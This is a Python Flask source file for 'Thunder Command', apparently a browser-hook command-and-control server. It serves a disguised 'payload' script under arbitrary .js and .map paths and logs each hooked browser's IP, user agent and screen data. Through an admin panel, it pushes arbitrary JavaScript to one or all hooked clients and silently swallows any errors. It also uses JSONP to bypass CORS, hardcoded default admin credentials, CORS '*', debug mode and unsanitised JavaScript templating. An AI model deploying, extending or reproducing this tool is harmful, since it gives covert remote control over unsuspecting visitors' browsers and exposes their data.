import json
import time
from flask import Flask, Response, jsonify, request, render_template, send_from_directory, session, redirect, url_for
from werkzeug.exceptions import HTTPException
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime, timedelta
from functools import wraps
import os
import uuid
import mimetypes
from core.utils.logger import app_logger, websocket_logger, command_logger, auth_logger, log_command, log_websocket_event, log_auth_event
from core.database import init_db, ClientRepository, CommandRepository
from collections import deque

# Initialize database
init_db()

# Global variables - these will now use the database repositories under the hood
client_repo = ClientRepository()
command_repo = CommandRepository()

# In-memory data for faster lookups and websocket management
clients = {}  # Client cache
commands = {}  # Active commands
socket_clients = {}  # WebSocket sessions
command_logs = deque(maxlen=1000)  # Recent command history

def initialize_global_state():
    """Initialize global state from database"""
    try:
        # Load active clients
        for client in client_repo.list_clients(active_only=True):
            client_id = client['id']
            clients[client_id] = {
                'id': client_id,
                'first_seen': client['first_seen'],
                'last_seen': client['last_seen'],
                'last_activity': client.get('last_activity'),
                'user_agent': client.get('user_agent'),
                'ip': client.get('ip'),
                'connection_type': client.get('connection_type'),
                'commands_received': client.get('commands_received', 0),
                'successful_commands': client.get('successful_commands', 0),
                'failed_commands': client.get('failed_commands', 0),
                'screen_info': client.get('screen_info', {})
            }

            # Load active command for each client
            command = command_repo.get_client_command(client_id)
            if command:
                commands[client_id] = command

        # Load recent command logs
        recent_logs = command_repo.get_logs(limit=1000)
        command_logs.extend(recent_logs)

        app_logger.info("Global state initialized from database")
    except Exception as e:
        app_logger.error(f"Error initializing global state: {e}")
        raise

# Initialize global state at startup
initialize_global_state()

# Custom error handling
class CommandError(Exception):
    def __init__(self, message, status_code=400):
        super().__init__()
        self.message = message
        self.status_code = status_code

# Error handler for custom exceptions
def handle_error(error):
    response = jsonify({
        "success": False,
        "error": error.message if hasattr(error, 'message') else str(error),
        "status": error.status_code if hasattr(error, 'status_code') else 500
    })
    response.status_code = error.status_code if hasattr(error, 'status_code') else 500
    app_logger.error(f"Error occurred: {error}")
    return response

# Importação condicional para Socket.IO
socketio_available = False
try:
    from flask_socketio import SocketIO, emit
    socketio_available = True
except ImportError:
    app_logger.warning("flask-socketio not available. Falling back to traditional HTTP polling.")

"""
Thunder Command: Sistema de Controle Remoto para Páginas Web
============================================

Um sistema de execução de comandos JavaScript em tempo real para páginas web. 
Esta aplicação permite que administradores executem JavaScript remotamente, 
manipulem elementos DOM, injetem HTML e controlem a visibilidade de elementos 
em páginas web cliente sem necessidade de atualização.

Funcionalidades:
    - Execução de comandos em tempo real via WebSocket ou HTTP polling
    - Capacidades de manipulação DOM (adicionar, substituir, inserir conteúdo)
    - Painel administrativo para monitoramento de clientes
    - Rastreamento e gerenciamento de conexões de clientes
    - Histórico de comandos e registro de execução
    - Suporte para WebSocket e polling HTTP tradicional
    - Autenticação segura para acesso administrativo

Detalhes Técnicos:
    - Construído com Flask e Flask-SocketIO
    - Suporta comunicação síncrona e assíncrona
    - Usa armazenamento em memória com histórico de comandos limitado
    - Implementa gerenciamento seguro de sessões
    - Fornece mecanismos de fallback para indisponibilidade de WebSocket

Autores: MrCl0wn Security Lab
Criação: Maio/2025
Versão: 1.0 (Atualizado com WebSockets)
"""

# Configuração para compatibilidade Windows com MIME types
mimetypes.add_type('application/javascript', '.js')

# Inicialização e configuração do aplicativo Flask
app = Flask(__name__, static_folder='static', static_url_path='/static')
app.secret_key = os.environ.get('SECRET_KEY', 'dev_key_change_in_production')
app.register_error_handler(Exception, handle_error)

# Configuração do Socket.IO se disponível
if socketio_available:
    try:
        socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
        app_logger.info("Socket.IO initialized successfully in threading mode")
    except Exception as e:
        socketio_available = False
        app_logger.error(f"Failed to initialize Socket.IO: {e}")
        app_logger.warning("Falling back to traditional HTTP polling")
else:
    socketio = None

# Credenciais de autenticação para o painel de administração
# AVISO DE SEGURANÇA: Em ambiente de produção, estas credenciais devem estar em
# variáveis de ambiente ou em um banco de dados seguro, nunca hardcoded
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'tandera')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'tandera')
ADMIN_PASSWORD_HASH = generate_password_hash(ADMIN_PASSWORD)

# Inicializa comando padrão
default_command = {
    "id": str(uuid.uuid4()),
    "command": "",
    "timestamp": datetime.now().isoformat()
}
CommandRepository.create('default', 'js', '', default_command['id'])

# Função auxiliar para formatar código JavaScript em um bloco try-catch
def js_format_try_catch(js_code):
    """Envolve código JavaScript em um bloco try-catch para tratamento de erros.
    
    Previne que erros de execução JavaScript interrompam o resto do código,
    envolvendo o código fornecido em uma função auto-executável dentro de um
    bloco try-catch. Se ocorrer um erro durante a execução, ele será
    silenciosamente capturado.
    
    Args:
        js_code (str): O código JavaScript a ser envolvido no bloco try-catch.
            Pode ser qualquer declaração ou expressão JavaScript válida.
    
    Returns:
        str: O código JavaScript envolvido no formato:
            try{(function(){...código...}());}catch(err){}
            Retorna None se js_code estiver vazio ou for None.
    
    Exemplo:
        >>> js_format_try_catch("document.getElementById('test').innerHTML = 'Olá';")
        "try{(function(){document.getElementById('test').innerHTML = 'Olá';}());}catch(err){}"
    """
    if js_code:
        return f'try{{(function(){{{js_code}}}());}}catch(err){{}}'

# Decorator para proteger rotas que exigem autenticação
def login_required(f):
    """Decorator para proteger rotas que requerem autenticação.
    
    Verifica se o usuário está logado através da presença de 'logged_in' na sessão.
    Se não estiver logado, redireciona para a página de login com a URL original
    como parâmetro 'next'.
    
    Args:
        f (callable): A função de visualização a ser decorada.
    
    Returns:
        callable: A função decorada que verifica a autenticação antes de executar
            a função de visualização original.
    
    Exemplo de Uso:
        @app.route('/admin')
        @login_required
        def admin():
            return render_template('admin.html')
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Rota de autenticação para o painel administrativo.
    
    GET: Exibe a página de login
    POST: Processa a tentativa de login
    
    Returns:
        GET: Página de login com mensagem de erro opcional
        POST: Redirecionamento para o painel admin em caso de sucesso,
              ou página de login com mensagem de erro
    """
    error = None
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if not username or not password:
            error = 'Username and password are required'
            log_auth_event('login_attempt', username, success=False, error='Missing credentials')
            return render_template('login.html', error=error)
        
        try:
            if username == ADMIN_USERNAME and check_password_hash(ADMIN_PASSWORD_HASH, password):
                session['logged_in'] = True
                log_auth_event('login_success', username)
                return redirect(request.args.get('next') or url_for('admin'))
            else:
                error = 'Invalid credentials'
                log_auth_event('login_failure', username, success=False, error='Invalid credentials')
        except Exception as e:
            error = 'An error occurred during login'
            log_auth_event('login_error', username, success=False, error=str(e))
            app_logger.exception('Login error occurred')
    
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    """Rota para encerrar a sessão do administrador"""
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/admin/set_command', methods=['POST'])
@login_required
def set_command():
    """Define um comando para execução em um cliente específico."""
    try:
        data = request.get_json()
        if not data:
            raise CommandError("Invalid request: No JSON data provided")
        
        client_id = data.get('client_id')
        command_type = data.get('type')
        content = data.get('content')
        
        if not all([client_id, command_type]):
            raise CommandError("Missing required parameters: client_id and type are required")
        
        command_id = str(uuid.uuid4())
        current_time = datetime.now().isoformat()
        
        js_command = ""
        try:
            # Generate JavaScript command based on type
            if command_type == 'js':
                js_command = content
            elif command_type == 'html':
                js_command = f"""
                    const temp = document.createElement('div');
                    temp.innerHTML = `{content}`;
                    document.body.appendChild(temp);
                """
            elif command_type == 'manipulate':
                target_id = data.get('target_id')
                action = data.get('action')
                if not target_id or not action:
                    raise CommandError("For manipulate commands, target_id and action are required")
                
                # Generate command based on action type
                js_command = generate_manipulation_command(target_id, action, content)
            elif command_type == 'visibility':
                target_id = data.get('target_id')
                visibility = data.get('visibility')
                if not target_id or not visibility:
                    raise CommandError("For visibility commands, target_id and visibility are required")
                
                # Generate visibility command
                display_value = 'none' if visibility == 'hide' else 'block'
                # Try both class and ID selectors
                js_command = f"""
                    const elementById = document.getElementById('{target_id}');
                    const elementsByClass = document.getElementsByClassName('{target_id}');
                    if (elementById) {{
                        elementById.style.display = '{display_value}';
                    }} else if (elementsByClass.length > 0) {{
                        Array.from(elementsByClass).forEach(el => el.style.display = '{display_value}');
                    }}
                """
            else:
                raise CommandError(f"Unsupported command type: {command_type}")
            
            # Wrap command in try-catch
            if js_command:
                js_command = js_format_try_catch(js_command)
            
            # Create command data
            command_data = {
                "id": command_id,
                "command": js_command,
                "timestamp": current_time,
                "type": command_type
            }
            
            # Store command in database and update cache
            # Update command handling for default
            if client_id == 'default':
                # Store as default command for new clients
                commands['default'] = command_data
                
                # Apply to all active clients
                for active_client_id, client_data in clients.items():
                    if client_data.get('active', False):
                        # Store command for each active client
                        commands[active_client_id] = command_data
                        
                        # Send via WebSocket if available for this client
                        if socketio_available and active_client_id in socket_clients:
                            try:
                                socketio.emit('command', command_data, room=socket_clients[active_client_id])
                            except Exception as e:
                                app_logger.error(f"Failed to send command via WebSocket to client {active_client_id}: {e}")
            else:
                # Single client command handling
                command = command_repo.create(client_id, command_type, js_command, command_id)
                commands[client_id] = command_data
                
                # Update client info
                if client_id in clients:
                    clients[client_id]["last_command"] = current_time
                    
                # Send via WebSocket if available
                if socketio_available and client_id in socket_clients:
                    try:
                        socketio.emit('command', command_data, room=socket_clients[client_id])
                    except Exception as e:
                        app_logger.error(f"Failed to send command via WebSocket: {e}")

            # Log command
            log_command(client_id, command_type, command_id)

            # Add to command history
            log_entry = {
                "id": command_id,
                "client_id": client_id,
                "type": command_type,
                "command": js_command,
                "timestamp": current_time
            }
            command_logs.append(log_entry)
            
            return jsonify({"success": True, "command": command_data})
            
        except Exception as e:
            error_msg = f"Error processing command: {str(e)}"
            log_command(client_id, command_type, command_id, success=False, error=error_msg)
            raise CommandError(error_msg)
            
    except Exception as e:
        app_logger.exception("Error in set_command endpoint")
        raise CommandError(str(e))

def generate_manipulation_command(target_id, action, content):
    """Gera comandos JavaScript para operações de manipulação do DOM.
    
    Cria código JavaScript para manipular elementos DOM por ID ou nome de classe.
    A função gera múltiplos comandos alternativos para lidar com seletores de
    classe e ID, garantindo que a operação funcione independentemente de como
    o elemento é identificado.
    
    Args:
        target_id (str): O ID ou nome da classe do elemento DOM alvo.
        action (str): O tipo de manipulação a ser realizada. Valores válidos são:
            - 'ADD': Adiciona conteúdo ao elemento existente
            - 'REPLACE': Substitui todo o conteúdo do elemento
            - 'INSERT_AFTER': Insere conteúdo após o elemento
            - 'INSERT_BEFORE': Insere conteúdo antes do elemento
        content (str): O conteúdo HTML para inserir ou manipular.
    
    Returns:
        str: Comandos JavaScript concatenados envolvidos em blocos try-catch para
            tratamento de erros.
    
    Raises:
        CommandError: Se o tipo de ação não for um dos valores suportados.
    
    Exemplo:
        >>> generate_manipulation_command('meuDiv', 'ADD', '<p>Olá</p>')
        'try{...}catch(err){}try{...}catch(err){}'
    """
    commands = {
        'ADD': [
            f"document.getElementsByClassName('{target_id}')[0].innerHTML += `{content}`;",
            f"document.getElementById('{target_id}').innerHTML += `{content}`;"
        ],
        'REPLACE': [
            f"document.getElementsByClassName('{target_id}')[0].innerHTML = `{content}`;",
            f"document.getElementById('{target_id}').innerHTML = `{content}`;"
        ],
        'INSERT_AFTER': [
            f"document.getElementsByClassName('{target_id}')[0].insertAdjacentHTML('afterend', `{content}`);",
            f"document.getElementById('{target_id}').insertAdjacentHTML('afterend', `{content}`);"
        ],
        'INSERT_BEFORE': [
            f"document.getElementsByClassName('{target_id}')[0].insertAdjacentHTML('beforebegin', `{content}`);",
            f"document.getElementById('{target_id}').insertAdjacentHTML('beforebegin', `{content}`);"
        ]
    }
    
    if action not in commands:
        raise CommandError(f"Invalid action type: {action}")
        
    return "".join([js_format_try_catch(cmd) for cmd in commands[action]])

@app.route('/admin/clients')
@login_required
def get_clients():
    """
    Endpoint para listar todos os clientes conectados.
    Limpa clientes inativos automaticamente (sem atividade por 30+ minutos).
    """
    # Atualiza status de atividade de todos os clientes
    update_client_active_status()
    
    # Formata dados dos clientes para exibição no frontend
    client_list = [
        {
            "id": client_id,
            "active": client.get("active", False),
            "last_seen": client.get("last_seen", ""),
            "user_agent": client.get("user_agent", ""),
            "ip": client.get("ip", ""),
            "websocket": client_id in socket_clients  # Indica se o cliente está usando WebSockets
        }
        for client_id, client in clients.items()
    ]
    
    return jsonify({"success": True, "clients": client_list})

@app.route('/admin/client/<client_id>')
@login_required
def get_client_details(client_id):
    """
    Endpoint para obter detalhes de um cliente específico por ID.
    """
    if client_id not in clients:
        return jsonify({}), 404
        
    client = clients[client_id]
    cleanup_time = (datetime.now() - timedelta(minutes=30)).isoformat()
    
    # Formata dados do cliente para exibição detalhada
    client_details = {
        "id": client_id,
        "active": client.get("last_seen", "") > cleanup_time,
        "last_seen": client.get("last_seen", ""),
        "last_activity": client.get("last_activity", ""),
        "user_agent": client.get("user_agent", ""),
        "ip": client.get("ip", ""),
        "websocket": client_id in socket_clients,  # Indica se o cliente está usando WebSockets
        "first_seen": client.get("first_seen", ""),
        "commands_received": client.get("commands_received", 0),
        "screen_info": client.get("screen_info", {})
    }
    
    return jsonify(client_details)

@app.route('/admin/clients/<client_id>', methods=['DELETE'])
@login_required
def remove_client(client_id):
    """
    Endpoint para remover um cliente específico do sistema.
    Remove também os comandos associados a este cliente.
    """
    if client_id in clients:
        del clients[client_id]
        if client_id in commands:
            del commands[client_id]
            
        # Se o cliente estiver conectado por WebSockets e Socket.IO estiver disponível, notificá-lo para desconectar
        if socketio_available and client_id in socket_clients:
            socketio.emit('disconnect_request', room=socket_clients[client_id])
            # Remover do mapeamento de socket_clients (a conexão Socket.IO real será encerrada pelo cliente)
            del socket_clients[client_id]
            
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": "Client not found"}), 404

@app.route('/admin/logs')
@login_required
def get_logs():
    """Endpoint para obter o histórico de comandos enviados"""
    return jsonify({"success": True, "logs": list(command_logs)})

@app.route('/')
def index():
    """
    Página inicial do cliente que receberá os comandos do servidor.
    Renderiza o template server_to_client.html.
    """
    return render_template('server_to_client.html', title='Cliente - Thunder Command')

@app.route('/admin')
@login_required
def admin():
    """
    Painel de administração para envio de comandos.
    Acesso protegido pelo decorator login_required.
    """
    return render_template('admin-dashboard.html', title='Painel de Administração - Thunder Command')

@app.route('/<int:dinamic_id>/<dinamic_file>')
def serve_payload_js(dinamic_file, dinamic_id):
    """
    Serve arquivos JavaScript dinâmicos com configuração de cache.
    Este arquivo é responsável por verificar e executar os comandos recebidos.
    """
    # Verifica definição de dinamic_file e dinamic_id
    if not dinamic_file and dinamic_id:
        return jsonify({"error": "Not Found"}), 440
    # Verifica extensão do arquivo
    if not dinamic_file.endswith(('.js','.map')):
        return jsonify({"error": "Not Found"}), 440
    
    response = send_from_directory('payload', 'cmd.js', mimetype='application/javascript')
    response.headers['Cache-Control'] = 'public, max-age=604800'
    return response

# Rota para servir a biblioteca cliente do Socket.IO
@app.route('/js/socket.io.min.js')
@app.route('/js/socket.io.min.js.map')
def serve_socketio_js():
    """Rota para servir a biblioteca cliente do Socket.IO"""
    response = send_from_directory('static/js', 'socket.io.min.js', mimetype='application/javascript')
    response.headers['Cache-Control'] = 'public, max-age=604800'
    return response

# Route for serving static images
@app.route('/static/img/<path:filename>')
def serve_image(filename):
    """Serve image files with proper caching headers"""
    # Verify the file is an image by checking extension
    allowed_extensions = ('jpg', 'jpeg', 'png', 'gif', 'svg', 'webp', 'bmp', 'ico')
    if not filename.lower().endswith(allowed_extensions):
        return jsonify({"error": "Forbidden: Not an image file"}), 403
        
    response = send_from_directory('static/img', filename)
    response.headers['Cache-Control'] = 'public, max-age=31536000'  # Cache for 1 year
    return response


# Rota principal para o polling de comandos pelos clientes
@app.route('/command')
def get_command():
    """Endpoint principal para polling de comandos pelos clientes."""
    client_id = request.args.get('client_id', 'default')
    last_received = request.args.get('last_id', '')
    callback = request.args.get('callback')
    
    # Registra ou atualiza informações do cliente
    if client_id != 'default':
        now = datetime.now().isoformat()
        if client_id not in clients:
            # Inicializa dados para novo cliente
            client_data = {
                "id": client_id,
                "first_seen": now,
                "last_seen": now,
                "last_activity": now,
                "user_agent": request.headers.get('User-Agent', ''),
                "ip": request.remote_addr,
                "connection_type": "polling",
                "commands_received": 0,
                "successful_commands": 0,
                "failed_commands": 0,
                "screen_info": {}
            }
            # Salva no banco e no cache
            client_repo.create_or_update(client_id, **client_data)
            clients[client_id] = client_data

            # Transfere qualquer comando default para o novo cliente
            if 'default' in commands and commands['default'].get('id'):
                commands[client_id] = commands['default']
        else:
            # Atualiza informações do cliente existente
            client_data = {
                "last_seen": now,
                "last_activity": now,
                "user_agent": request.headers.get('User-Agent', ''),
                "ip": request.remote_addr
            }
            client_repo.create_or_update(client_id, **client_data)
            clients[client_id].update(client_data)
            
            # Atualiza status de ativo
            clients[client_id]['active'] = True

    # Obtém o comando atual para este cliente
    current_command = commands.get(client_id, {"id": "", "command": "", "timestamp": ""})
    
    # Se não há comando específico e há um comando default, usa o default
    if not current_command.get('id') and 'default' in commands:
        current_command = commands['default']
    
    # Log para depuração
    app_logger.debug(f"Cliente {client_id} solicitou comando. Último recebido: {last_received}, Atual: {current_command.get('id', '')}")
    
    # Prepara a resposta com indicação se é um comando novo
    response_data = {
        "new": last_received != current_command.get("id", ""),
        **current_command
    }
    
    # Formata a resposta conforme necessário (JSONP ou JSON padrão)
    if callback:
        # Formato JSONP para contornar restrições de CORS
        response = app.response_class(
            response=f"{callback}({json.dumps(response_data)})",
            status=200,
            mimetype="application/javascript"
        )
    else:
        # JSON padrão com cabeçalhos CORS
        response = jsonify(response_data)
        response.headers['Access-Control-Allow-Origin']  = '*'
        response.headers['Access-Control-Allow-Methods'] = '*'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    
    return response

# Socket.IO eventos - definidos apenas se o Socket.IO estiver disponível
if socketio_available:
    @socketio.on('connect')
    def handle_connect():
        """Manipula novas conexões WebSocket.
        
        Registra novas conexões e atribui um ID de sessão. Esta é a conexão
        WebSocket inicial, antes do registro do cliente.
        
        Nota:
            Isto não significa que o cliente está registrado ainda. Os clientes
            devem enviar um evento 'register' após a conexão para serem
            completamente inicializados.
        
        Eventos Emitidos:
            Nenhum evento emitido diretamente.
        """
        try:
            session_id = request.sid
            log_websocket_event('connect', data={'session_id': session_id})
        except Exception as e:
            log_websocket_event('connect_error', error=str(e))
            app_logger.exception("Error in WebSocket connect handler")

    @socketio.on('register')
    def handle_register(data):
        """Registra um cliente conectado via WebSocket."""
        try:
            client_id = data.get('client_id')
            if not client_id:
                raise ValueError("No client_id provided")
            
            session_id = request.sid
            log_websocket_event('register', client_id, {'session_id': session_id})
            
            # Associate client_id with WebSocket session
            socket_clients[client_id] = session_id
            
            # Initialize or update client data
            now = datetime.now().isoformat()
            if client_id not in clients:
                client_data = {
                    "id": client_id,
                    "first_seen": now,
                    "last_seen": now,
                    "last_activity": now,
                    "user_agent": request.headers.get('User-Agent', ''),
                    "ip": request.remote_addr,
                    "connection_type": "websocket",
                    "commands_received": 0,
                    "successful_commands": 0,
                    "failed_commands": 0,
                    "screen_info": {}
                }
                # Salva no banco e no cache
                client_repo.create_or_update(client_id, **client_data)
                clients[client_id] = client_data

                if client_id not in commands:
                    commands[client_id] = commands.get('default', {
                        "id": "",
                        "command": "",
                        "timestamp": ""
                    })
            else:
                # Atualiza informações do cliente existente
                client_data = {
                    "last_seen": now,
                    "last_activity": now,
                    "user_agent": request.headers.get('User-Agent', ''),
                    "ip": request.remote_addr,
                    "connection_type": "websocket"
                }
                client_repo.create_or_update(client_id, **client_data)
                clients[client_id].update(client_data)
            
            # Salva informações da sessão WebSocket
            client_repo.update_socket_session(client_id, session_id)

            # Notify admin about new client
            try:
                socketio.emit('client_update', {
                    "action": "connect",
                    "client": {
                        "id": client_id,
                        "active": True,
                        "last_seen": clients[client_id]["last_seen"],
                        "websocket": True
                    }
                }, room='admin')
            except Exception as e:
                log_websocket_event('admin_notification_error', client_id, error=str(e))
            
            # Send last command to client
            if client_id in commands:
                try:
                    current_command = commands[client_id]
                    emit('command', current_command)
                    log_websocket_event('command_sent', client_id, {'command_id': current_command.get('id')})
                except Exception as e:
                    log_websocket_event('command_send_error', client_id, error=str(e))
                    
        except Exception as e:
            log_websocket_event('register_error', error=str(e))
            app_logger.exception("Error in WebSocket register handler")
            emit('register_error', {"error": str(e)})

    @socketio.on('disconnect')
    def handle_disconnect():
        """Handle WebSocket disconnections"""
        try:
            session_id = request.sid
            
            # Find client_id associated with this session
            client_id = None
            for cid, sid in socket_clients.items():
                if sid == session_id:
                    client_id = cid
                    break
            
            if client_id:
                log_websocket_event('disconnect', client_id)
                
                # Remove socket mapping
                del socket_clients[client_id]
                
                # Update client status in memory and database
                if client_id in clients:
                    clients[client_id]["connection_type"] = "disconnected"
                    client_repo.create_or_update(client_id, connection_type="disconnected")
                
                # Remove socket session from database
                client_repo.remove_socket_session(client_id)
                
                # Notify admin
                try:
                    socketio.emit('client_update', {
                        "action": "disconnect",
                        "client_id": client_id
                    }, room='admin')
                except Exception as e:
                    log_websocket_event('admin_notification_error', client_id, error=str(e))
            else:
                log_websocket_event('disconnect', data={'session_id': session_id, 'note': 'No associated client'})
                
        except Exception as e:
            log_websocket_event('disconnect_error', error=str(e))
            app_logger.exception("Error in WebSocket disconnect handler")

    @socketio.on('join_admin')
    def handle_join_admin():
        """Administrators join the 'admin' room for real-time updates"""
        try:
            if 'logged_in' in session:
                session_id = request.sid
                socketio.server.enter_room(session_id, 'admin')
                log_websocket_event('admin_join', data={'session_id': session_id})
                emit('admin_joined', {"success": True})
            else:
                log_websocket_event('admin_join_unauthorized', data={'session_id': request.sid})
                emit('admin_joined', {"success": False, "error": "Unauthorized"})
        except Exception as e:
            log_websocket_event('admin_join_error', error=str(e))
            app_logger.exception("Error in admin join handler")
            emit('admin_joined', {"success": False, "error": str(e)})

@app.route('/command/result', methods=['POST'])
def receive_command_result():
    """Endpoint para receber resultados da execução de comandos dos clientes."""
    try:
        data = request.get_json()
        if not data:
            raise CommandError("Invalid request: No JSON data provided")
        
        client_id = data.get('client_id')
        command_id = data.get('command_id')
        success = data.get('success', False)
        timestamp = datetime.now().isoformat()
        result = data.get('result', '')
        execution_time = data.get('execution_time', 0)
        
        if not client_id or not command_id:
            raise CommandError("Missing required parameters: client_id and command_id")
        
        # Create result entry and save to database
        command_repo.add_result(command_id, client_id, success, result, execution_time)
        
        # Create result entry for memory cache
        result_entry = {
            "client_id": client_id,
            "command_id": command_id,
            "success": success,
            "timestamp": timestamp,
            "result": result,
            "execution_time": execution_time
        }
        
        # Update command logs in memory
        updated = False
        for log in command_logs:
            if log["id"] == command_id:
                log["results"] = log.get("results", [])
                log["results"].append(result_entry)
                log["last_result"] = result_entry
                log["success_count"] = len([r for r in log["results"] if r["success"]])
                log["error_count"] = len([r for r in log["results"] if not r["success"]])
                updated = True
                break
        
        if not updated:
            app_logger.warning(f"Received result for unknown command: {command_id}")
        
        # Update client information in cache
        if client_id in clients:
            clients[client_id]["last_activity"] = timestamp
            clients[client_id]["last_result"] = {
                "command_id": command_id,
                "success": success,
                "timestamp": timestamp
            }
        
        # Update client activity in database
        client_repo.update_activity(client_id)
        
        # Log command result
        if success:
            log_command(client_id, "result", command_id, success=True)
        else:
            log_command(client_id, "result", command_id, success=False, error=result)
        
        # Notify admins via WebSocket
        if socketio_available:
            try:
                socketio.emit('command_result', result_entry, room='admin')
            except Exception as e:
                error_msg = f"Failed to notify admins: {str(e)}"
                app_logger.error(error_msg)
                log_websocket_event('command_result_notification_error', client_id, error=error_msg)
        
        return jsonify({"success": True})
        
    except Exception as e:
        app_logger.exception("Error processing command result")
        raise CommandError(str(e))

@app.route('/favicon.ico')
def favicon():
    """Rota para o favicon.ico"""
    return send_from_directory(os.path.join(app.root_path, 'static'), 'favicon.ico', mimetype='image/vnd.microsoft.icon')

def is_client_active(client, cleanup_time=None):
    """
    Verifica se um cliente está ativo baseado em seu último registro de atividade.
    
    Args:
        client: Dicionário com dados do cliente
        cleanup_time: String ISO formatada do tempo limite para inatividade.
                     Se não fornecido, usa 30 minutos atrás.
                     
    Returns:
        bool: True se o cliente está ativo, False caso contrário
    """
    if not cleanup_time:
        cleanup_time = (datetime.now() - timedelta(minutes=30)).isoformat()
    return client.get("last_seen", "") > cleanup_time

def update_client_active_status():
    """
    Atualiza o status ativo/inativo de todos os clientes no cache.
    Remove clientes inativos do dicionário socket_clients.
    """
    cleanup_time = (datetime.now() - timedelta(minutes=30)).isoformat()
    inactive_clients = []
    
    for client_id, client in clients.items():
        # Atualiza o status de ativo
        client['active'] = is_client_active(client, cleanup_time)
        
        # Se inativo, adiciona à lista para limpar socket_clients
        if not client['active'] and client_id in socket_clients:
            inactive_clients.append(client_id)
    
    # Remove clientes inativos de socket_clients
    for client_id in inactive_clients:
        del socket_clients[client_id]

if __name__ == '__main__':
    if socketio_available:
        try:
            # Inicialização do servidor com Socket.IO
            socketio.run(app, debug=True, allow_unsafe_werkzeug=True)
        except Exception as e:
            app_logger.error(f"Erro ao iniciar com Socket.IO: {e}")
            app_logger.info("Iniciando no modo Flask padrão...")
            app.run(debug=True)
    else:
        # Fallback para Flask padrão sem Socket.IO
        app.run(debug=True)
